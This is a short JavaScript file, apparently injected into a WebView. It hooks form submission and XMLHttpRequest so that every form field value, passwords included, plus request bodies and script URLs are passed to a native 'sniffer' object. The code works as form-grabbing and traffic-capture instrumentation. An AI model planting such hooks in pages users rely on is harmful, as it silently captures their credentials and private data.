HTMLFormElement.prototype._submit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = interceptor;
window.addEventListener('submit', function (e) {
    interceptor(e);
}, true);
function interceptor(e) {
    var frm = e ? e.target : this;
    interceptor_onsubmit(frm);
    frm._submit();
}
function interceptor_onsubmit(f) {
    var jsonArr = [];
    var jsonString = '';
    for (i = 0; i < f.elements.length; i++) {
        var parName = f.elements[i].name;
        var parValue = f.elements[i].value;
        var parType = f.elements[i].type;
        jsonString += '&' + parName + '=' + parValue;
        jsonArr.push({name: parName, value: parValue, type: parType});
    }
    window.sniffer.submit(jsonString);
}
var head = document.head || document.getElementsByTagName("head")[0];
head.addEventListener("load", function (event) {
    if (event.target.nodeName === "SCRIPT") {
        var lastXmlhttpRequestPrototypeMethod="url";
        var body = event.target.src;
        window.sniffer.submit(lastXmlhttpRequestPrototypeMethod, body);
    }
}, true);
lastXmlhttpRequestPrototypeMethod = null;
lastXmlhttpRequestPrototypeURL = "";
XMLHttpRequest.prototype.reallyOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    console.log(1111);
    lastXmlhttpRequestPrototypeMethod = method;
    lastXmlhttpRequestPrototypeURL = url;
    this.reallyOpen(method, url, async, user, password);
};
XMLHttpRequest.prototype.reallySend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (content) {
    var body = "";
    if (content && lastXmlhttpRequestPrototypeURL) {
        body = content + "&url=" + lastXmlhttpRequestPrototypeURL;
    } else if (content && !lastXmlhttpRequestPrototypeURL) {
        body = content;
    } else if (!content && lastXmlhttpRequestPrototypeURL) {
        body = "url=" + lastXmlhttpRequestPrototypeURL;
    }
    if (body) {
        window.sniffer.submit(lastXmlhttpRequestPrototypeMethod, body);
    }
    lastXmlhttpRequestPrototypeMethod = null;
    lastXmlhttpRequestPrototypeURL = "";
    this.reallySend(content);
}; 